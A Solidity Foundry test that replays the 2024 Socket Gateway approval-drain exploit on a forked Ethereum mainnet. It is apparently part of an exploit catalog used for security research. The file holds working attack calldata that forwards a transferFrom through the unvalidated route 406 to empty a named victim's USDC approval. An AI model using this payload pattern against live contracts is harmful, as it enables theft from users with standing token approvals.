// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

/// FORK REPLAY — Socket Gateway approval drain (Ethereum, 2024-01-16, ~$3.3M).
/// Ground-truth instance of catalog entry `approval-drain-arbitrary-call`
/// (docs/exploits/approval-drain-arbitrary-call-2024-02.md): the Socket Gateway dispatched to a
/// newly-added, unvalidated route (id 406) whose `performAction` forwards caller-supplied
/// `swapExtraData` as a low-level call to `fromToken`. Because users hold standing approvals to the
/// gateway, an attacker sets `fromToken = USDC` and `swapExtraData = transferFrom(victim, attacker,
/// balance)` to drain any approver.
///
/// This is NOT a hand-built model (see poc/test/ApprovalDrain.t.sol for that) — it forks real
/// mainnet state at the pre-attack block and exploits the REAL deployed gateway + a REAL victim's
/// live approval. We only deploy our attacker (this test contract).
///
/// Run: set -a; source .env; set +a; forge test --match-contract SocketApprovalDrainReplay -vvv
///
/// Public facts (addresses/block/route id) cross-referenced from the incident post-mortems and the
/// DeFiHackLabs index; the exploit calldata below is reconstructed from the route ABI, not copied.
interface ISocketGateway {
    function executeRoute(uint32 routeId, bytes calldata routeData)
        external
        payable
        returns (bytes memory);
}

interface ISocketVulnRoute {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData
    ) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract SocketApprovalDrainReplayTest is Test {
    address constant GATEWAY = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant VICTIM = 0x7d03149A2843E4200f07e858d6c0216806Ca4242; // had a live USDC approval to the gateway
    uint32 constant VULN_ROUTE_ID = 406;
    uint256 constant ATTACK_BLOCK = 19_021_453; // just before the real attack tx

    // The route calls back into the receiver after the action; accept it.
    receive() external payable {}
    fallback() external payable {}

    function test_realSocketGateway_drainsVictimApproval() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), ATTACK_BLOCK);

        uint256 victimBefore = IERC20(USDC).balanceOf(VICTIM);
        uint256 attackerBefore = IERC20(USDC).balanceOf(address(this));
        emit log_named_uint("victim USDC before", victimBefore);
        assertGt(victimBefore, 0, "victim must hold USDC (and have approved the gateway) at this block");

        // The attacker's payload: make the route call USDC.transferFrom(victim, attacker, victimBalance)
        // using the victim's standing approval to the gateway.
        bytes memory drainCall = abi.encodeWithSelector(
            IERC20.transferFrom.selector, VICTIM, address(this), victimBefore
        );
        bytes memory routeData = abi.encodeWithSelector(
            ISocketVulnRoute.performAction.selector,
            USDC, // fromToken — the route will .call() this address
            USDC, // toToken (unused for the drain)
            uint256(0), // amount
            address(this), // receiverAddress
            bytes32(0), // metadata
            drainCall // swapExtraData — the attacker-chosen forwarded call
        );

        // One call to the real gateway drains the real victim's approval.
        ISocketGateway(GATEWAY).executeRoute(VULN_ROUTE_ID, routeData);

        uint256 attackerAfter = IERC20(USDC).balanceOf(address(this));
        uint256 victimAfter = IERC20(USDC).balanceOf(VICTIM);
        emit log_named_uint("attacker USDC profit", attackerAfter - attackerBefore);
        emit log_named_uint("victim USDC after", victimAfter);

        // Invariant broken: a contract holding third-party approvals let an attacker-chosen call
        // reach a victim's standing allowance.
        assertEq(attackerAfter - attackerBefore, victimBefore, "attacker drained the victim's full balance");
        assertEq(victimAfter, 0, "victim's USDC emptied via their gateway approval");
    }
}
